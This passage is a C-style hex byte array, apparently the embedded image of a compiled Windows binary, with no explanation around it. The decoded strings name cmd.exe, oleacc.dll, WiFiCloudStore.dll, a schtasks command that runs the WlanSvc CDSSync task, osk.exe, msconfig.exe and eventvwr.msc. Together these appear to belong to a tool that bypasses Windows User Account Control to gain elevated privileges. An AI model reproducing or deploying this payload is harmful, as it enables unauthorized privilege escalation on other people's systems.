	0x12, 0x76, 0x00, 0x00, 0x1C, 0x76, 0x00, 0x00, 0x36, 0x76, 0x00, 0x00, 0x44, 0x76, 0x00, 0x00,
	0x60, 0x76, 0x00, 0x00, 0x72, 0x76, 0x00, 0x00, 0x80, 0x76, 0x00, 0x00, 0x8E, 0x76, 0x00, 0x00,
	0xA6, 0x76, 0x00, 0x00, 0xC0, 0x76, 0x00, 0x00, 0xE0, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC2, 0x74, 0x00, 0x00, 0xAE, 0x74, 0x00, 0x00, 0x9C, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0xA4, 0xAB, 0x2F, 0xA9, 0x4D, 0x13, 0x40, 0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85,
	0x9F, 0x36, 0x87, 0x0F, 0xE5, 0xA4, 0xFC, 0x4C, 0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD,
	0x5C, 0x00, 0x42, 0x00, 0x61, 0x00, 0x73, 0x00, 0x65, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x00, 0x00,
	0x64, 0x00, 0x00, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00,
	0x6F, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x61, 0x00, 0x63, 0x00, 0x63, 0x00, 0x2E, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65,
	0x73, 0x73, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x46, 0x72, 0x6F, 0x6D, 0x48, 0x77, 0x6E, 0x64,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x57, 0x00, 0x69, 0x00, 0x46, 0x00, 0x69, 0x00, 0x43, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x75, 0x00,
	0x64, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x65, 0x00, 0x2E, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x00, 0x73, 0x00, 0x63, 0x00, 0x68, 0x00, 0x74, 0x00, 0x61, 0x00, 0x73, 0x00, 0x6B, 0x00,
	0x73, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x52, 0x00,
	0x55, 0x00, 0x4E, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x54, 0x00, 0x4E, 0x00, 0x20, 0x00, 0x22, 0x00,
	0x5C, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00,
	0x66, 0x00, 0x74, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
	0x77, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x53, 0x00,
	0x76, 0x00, 0x63, 0x00, 0x5C, 0x00, 0x43, 0x00, 0x44, 0x00, 0x53, 0x00, 0x53, 0x00, 0x79, 0x00,
	0x6E, 0x00, 0x63, 0x00, 0x22, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6F, 0x00, 0x73, 0x00, 0x6B, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00,
	0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x00, 0x00,
	0x52, 0x00, 0x65, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x75, 0x00, 0x74, 0x00, 0x69, 0x00,
	0x6F, 0x00, 0x6E, 0x00, 0x48, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00,
	0x74, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x44, 0x00, 0x49, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x53, 0x00,
	0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x5C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x69, 0x00, 0x72, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x65, 0x00, 0x6E, 0x00, 0x2D, 0x00, 0x55, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x57, 0x00,
	0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x43, 0x00, 0x6C, 0x00, 0x61, 0x00,
	0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00,
	0x31, 0x00, 0x00, 0x00, 0x53, 0x00, 0x79, 0x00, 0x73, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00,
	0x74, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x33, 0x00, 0x32, 0x00, 0x00, 0x00,
	0x23, 0x00, 0x33, 0x00, 0x32, 0x00, 0x37, 0x00, 0x37, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x33, 0x00,
	0x32, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6D, 0x00, 0x73, 0x00, 0x63, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x69, 0x00, 0x67, 0x00,
	0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2D, 0x00, 0x35, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6D, 0x00, 0x6D, 0x00, 0x63, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00,
	0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x76, 0x00, 0x77, 0x00, 0x72, 0x00,
	0x2E, 0x00, 0x6D, 0x00, 0x73, 0x00, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x4D, 0x00,
	0x43, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x46, 0x00, 0x72, 0x00, 0x61, 0x00,
	0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0xF0, 0xD4, 0x68,
	0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0xEC, 0x00, 0x00, 0x00, 0xE8, 0x6D, 0x00, 0x00,
	0xE8, 0x57, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x34, 0x4D, 0x00, 0x00,
	0x0A, 0x00, 0x00, 0x00, 0x50, 0x01, 0x00, 0x00, 0x8A, 0x00, 0x00, 0x00, 0xB8, 0x44, 0x00, 0x00,
	0xF8, 0x49, 0x00, 0x00, 0x20, 0x4C, 0x00, 0x00, 0x4A, 0x4D, 0x00, 0x00, 0x95, 0x5C, 0x00, 0x00,
	0x8C, 0x51, 0x00, 0x00, 0x07, 0x55, 0x00, 0x00, 0xD8, 0x5C, 0x00, 0x00, 0x69, 0x56, 0x00, 0x00,
	0xB6, 0x56, 0x00, 0x00, 0x5A, 0x57, 0x00, 0x00, 0xB7, 0x57, 0x00, 0x00, 0x0F, 0x58, 0x00, 0x00,
	0x35, 0x59, 0x00, 0x00, 0x86, 0x59, 0x00, 0x00, 0x32, 0x5A, 0x00, 0x00, 0xF7, 0x5A, 0x00, 0x00,
	0x26, 0x5D, 0x00, 0x00, 0x09, 0x5C, 0x00, 0x00, 0xFB, 0x50, 0x00, 0x00, 0x7D, 0x52, 0x00, 0x00,
	0x56, 0x5B, 0x00, 0x00, 0x42, 0x51, 0x00, 0x00, 0x67, 0x50, 0x00, 0x00, 0xB0, 0x50, 0x00, 0x00,
	0xB2, 0x54, 0x00, 0x00, 0x6F, 0x5D, 0x00, 0x00, 0x35, 0x52, 0x00, 0x00, 0x57, 0x4F, 0x00, 0x00,
	0x10, 0x4F, 0x00, 0x00, 0xC6, 0x4E, 0x00, 0x00, 0x79, 0x4E, 0x00, 0x00, 0xDB, 0x4D, 0x00, 0x00,
	0x2A, 0x4E, 0x00, 0x00, 0x8E, 0x4D, 0x00, 0x00, 0x23, 0x50, 0x00, 0x00, 0x5C, 0x55, 0x00, 0x00,
	0x0C, 0x56, 0x00, 0x00, 0xD3, 0x58, 0x00, 0x00, 0x6E, 0x58, 0x00, 0x00, 0x9E, 0x4F, 0x00, 0x00,
	0xE2, 0x4F, 0x00, 0x00, 0xB1, 0x5B, 0x00, 0x00, 0xF9, 0x53, 0x00, 0x00, 0x56, 0x54, 0x00, 0x00,
	0xD3, 0x52, 0x00, 0x00, 0x32, 0x53, 0x00, 0x00, 0xE4, 0x51, 0x00, 0x00, 0xD6, 0x59, 0x00, 0x00,
	0x00, 0x57, 0x00, 0x00, 0x8F, 0x5A, 0x00, 0x00, 0xB2, 0x55, 0x00, 0x00, 0x51, 0x5C, 0x00, 0x00,
	0x96, 0x53, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x94, 0x22, 0x00, 0x00, 0xE2, 0x23, 0x00, 0x00,
	0x2C, 0x24, 0x00, 0x00, 0xAC, 0x24, 0x00, 0x00, 0x77, 0x23, 0x00, 0x00, 0x61, 0x27, 0x00, 0x00,
	0xE1, 0x27, 0x00, 0x00, 0x3A, 0x24, 0x00, 0x00, 0xDD, 0x23, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x28, 0x25, 0x00, 0x00, 0x24, 0x25, 0x00, 0x00,
	0x28, 0x25, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00,
	0x2F, 0x22, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00, 0x4C, 0x61, 0x00, 0x00, 0x9C, 0x61, 0x00, 0x00,
	0xE6, 0x61, 0x00, 0x00, 0x33, 0x62, 0x00, 0x00, 0x7E, 0x62, 0x00, 0x00, 0xCB, 0x62, 0x00, 0x00,
	0x1B, 0x63, 0x00, 0x00, 0x63, 0x63, 0x00, 0x00, 0xA9, 0x63, 0x00, 0x00, 0xF0, 0x63, 0x00, 0x00,
	0x3C, 0x64, 0x00, 0x00, 0x8B, 0x64, 0x00, 0x00, 0xD9, 0x64, 0x00, 0x00, 0x2C, 0x65, 0x00, 0x00,
	0x7E, 0x65, 0x00, 0x00, 0xCE, 0x65, 0x00, 0x00, 0x1F, 0x66, 0x00, 0x00, 0x6A, 0x66, 0x00, 0x00,
	0xBA, 0x66, 0x00, 0x00, 0x0A, 0x67, 0x00, 0x00, 0x51, 0x67, 0x00, 0x00, 0x97, 0x67, 0x00, 0x00,
	0xDB, 0x67, 0x00, 0x00, 0x1E, 0x68, 0x00, 0x00, 0x62, 0x68, 0x00, 0x00, 0xA6, 0x68, 0x00, 0x00,
	0xEA, 0x68, 0x00, 0x00, 0x33, 0x69, 0x00, 0x00, 0x84, 0x69, 0x00, 0x00, 0xD4, 0x69, 0x00, 0x00,
	0x22, 0x6A, 0x00, 0x00, 0x6F, 0x6A, 0x00, 0x00, 0xB8, 0x6A, 0x00, 0x00, 0xFC, 0x6A, 0x00, 0x00,
	0x3E, 0x6B, 0x00, 0x00, 0x89, 0x6B, 0x00, 0x00, 0xD4, 0x6B, 0x00, 0x00, 0x19, 0x6C, 0x00, 0x00,
	0x62, 0x6C, 0x00, 0x00, 0xB3, 0x6C, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x2F, 0x22, 0x00, 0x00, 0x40, 0x4D, 0x00, 0x00, 0x7B, 0x4D, 0x00, 0x00,
	0xC8, 0x4D, 0x00, 0x00, 0x15, 0x4E, 0x00, 0x00, 0x66, 0x4E, 0x00, 0x00, 0xB3, 0x4E, 0x00, 0x00,
	0x00, 0x4F, 0x00, 0x00, 0x47, 0x4F, 0x00, 0x00, 0x8E, 0x4F, 0x00, 0x00, 0xD5, 0x4F, 0x00, 0x00,
	0x16, 0x50, 0x00, 0x00, 0x57, 0x50, 0x00, 0x00, 0x9E, 0x50, 0x00, 0x00, 0xE9, 0x50, 0x00, 0x00,
	0x34, 0x51, 0x00, 0x00, 0x77, 0x51, 0x00, 0x00, 0xC8, 0x51, 0x00, 0x00, 0x27, 0x52, 0x00, 0x00,
	0x6A, 0x52, 0x00, 0x00, 0xB7, 0x52, 0x00, 0x00, 0x16, 0x53, 0x00, 0x00, 0x75, 0x53, 0x00, 0x00,
	0xDE, 0x53, 0x00, 0x00, 0x3B, 0x54, 0x00, 0x00, 0x98, 0x54, 0x00, 0x00, 0xF3, 0x54, 0x00, 0x00,
	0x42, 0x55, 0x00, 0x00, 0x9D, 0x55, 0x00, 0x00, 0xEE, 0x55, 0x00, 0x00, 0x51, 0x56, 0x00, 0x00,
	0xA8, 0x56, 0x00, 0x00, 0xEB, 0x56, 0x00, 0x00, 0x3C, 0x57, 0x00, 0x00, 0x9F, 0x57, 0x00, 0x00,
	0xF6, 0x57, 0x00, 0x00, 0x4F, 0x58, 0x00, 0x00, 0xB4, 0x58, 0x00, 0x00, 0x19, 0x59, 0x00, 0x00,
	0x78, 0x59, 0x00, 0x00, 0xBB, 0x59, 0x00, 0x00, 0x18, 0x5A, 0x00, 0x00, 0x73, 0x5A, 0x00, 0x00,
	0xD2, 0x5A, 0x00, 0x00, 0x43, 0x5B, 0x00, 0x00, 0x90, 0x5B, 0x00, 0x00, 0xF9, 0x5B, 0x00, 0x00,
	0x40, 0x5C, 0x00, 0x00, 0x89, 0x5C, 0x00, 0x00, 0xC8, 0x5C, 0x00, 0x00, 0x0F, 0x5D, 0x00, 0x00,
	0xA3, 0x5D, 0x00, 0x00, 0xBC, 0x5D, 0x00, 0x00, 0xCF, 0x5D, 0x00, 0x00, 0xEC, 0x5D, 0x00, 0x00,
	0xF6, 0x5D, 0x00, 0x00, 0x05, 0x5E, 0x00, 0x00, 0x20, 0x5E, 0x00, 0x00, 0x32, 0x5E, 0x00, 0x00,
	0x4E, 0x5E, 0x00, 0x00, 0x63, 0x5E, 0x00, 0x00, 0x77, 0x5E, 0x00, 0x00, 0x87, 0x5E, 0x00, 0x00,
	0x9A, 0x5E, 0x00, 0x00, 0xAB, 0x5E, 0x00, 0x00, 0xBE, 0x5E, 0x00, 0x00, 0xC7, 0x5E, 0x00, 0x00,
	0xD7, 0x5E, 0x00, 0x00, 0xE6, 0x5E, 0x00, 0x00, 0xFB, 0x5E, 0x00, 0x00, 0x0C, 0x5F, 0x00, 0x00,
	0x1C, 0x5F, 0x00, 0x00, 0x2F, 0x5F, 0x00, 0x00, 0x40, 0x5F, 0x00, 0x00, 0x50, 0x5F, 0x00, 0x00,
	0x66, 0x5F, 0x00, 0x00, 0x64, 0x5D, 0x00, 0x00, 0x78, 0x5F, 0x00, 0x00, 0x86, 0x5F, 0x00, 0x00,
	0x96, 0x5F, 0x00, 0x00, 0xA5, 0x5F, 0x00, 0x00, 0xB7, 0x5F, 0x00, 0x00, 0xC4, 0x5F, 0x00, 0x00,
	0xD2, 0x5F, 0x00, 0x00, 0xE2, 0x5F, 0x00, 0x00, 0xF1, 0x5F, 0x00, 0x00, 0xFF, 0x5F, 0x00, 0x00,
	0x0B, 0x60, 0x00, 0x00, 0x25, 0x60, 0x00, 0x00, 0x38, 0x60, 0x00, 0x00, 0x4F, 0x60, 0x00, 0x00,
	0x67, 0x60, 0x00, 0x00, 0x8E, 0x60, 0x00, 0x00, 0xA0, 0x60, 0x00, 0x00, 0xB3, 0x60, 0x00, 0x00,
	0xCA, 0x60, 0x00, 0x00, 0xE0, 0x60, 0x00, 0x00, 0xF2, 0x60, 0x00, 0x00, 0x37, 0x61, 0x00, 0x00,
	0x8A, 0x61, 0x00, 0x00, 0xD7, 0x61, 0x00, 0x00, 0x1E, 0x62, 0x00, 0x00, 0x71, 0x62, 0x00, 0x00,
	0xB4, 0x62, 0x00, 0x00, 0x0B, 0x63, 0x00, 0x00, 0x54, 0x63, 0x00, 0x00, 0x9B, 0x63, 0x00, 0x00,
	0xE0, 0x63, 0x00, 0x00, 0x29, 0x64, 0x00, 0x00, 0x78, 0x64, 0x00, 0x00, 0xC7, 0x64, 0x00, 0x00,
	0x14, 0x65, 0x00, 0x00, 0x6D, 0x65, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x0D, 0x66, 0x00, 0x00,
	0x5A, 0x66, 0x00, 0x00, 0xA3, 0x66, 0x00, 0x00, 0xFA, 0x66, 0x00, 0x00, 0x43, 0x67, 0x00, 0x00,
	0x88, 0x67, 0x00, 0x00, 0xCF, 0x67, 0x00, 0x00, 0x10, 0x68, 0x00, 0x00, 0x55, 0x68, 0x00, 0x00,
	0x98, 0x68, 0x00, 0x00, 0xDD, 0x68, 0x00, 0x00, 0x20, 0x69, 0x00, 0x00, 0x6F, 0x69, 0x00, 0x00,
	0xC2, 0x69, 0x00, 0x00, 0x0F, 0x6A, 0x00, 0x00, 0x5E, 0x6A, 0x00, 0x00, 0xA9, 0x6A, 0x00, 0x00,
	0xF0, 0x6A, 0x00, 0x00, 0x31, 0x6B, 0x00, 0x00, 0x74, 0x6B, 0x00, 0x00, 0xC7, 0x6B, 0x00, 0x00,
	0x0A, 0x6C, 0x00, 0x00, 0x51, 0x6C, 0x00, 0x00, 0x9C, 0x6C, 0x00, 0x00, 0xF3, 0x6C, 0x00, 0x00,
	0x00, 0x00, 0x1F, 0x00, 0x1D, 0x00, 0x1E, 0x00, 0x1C, 0x00, 0x1B, 0x00, 0x1A, 0x00, 0x19, 0x00,
	0x25, 0x00, 0x26, 0x00, 0x20, 0x00, 0x14, 0x00, 0x15, 0x00, 0x10, 0x00, 0x13, 0x00, 0x02, 0x00,
	0x2C, 0x00, 0x18, 0x00, 0x11, 0x00, 0x2A, 0x00, 0x2B, 0x00, 0x32, 0x00, 0x28, 0x00, 0x29, 0x00,
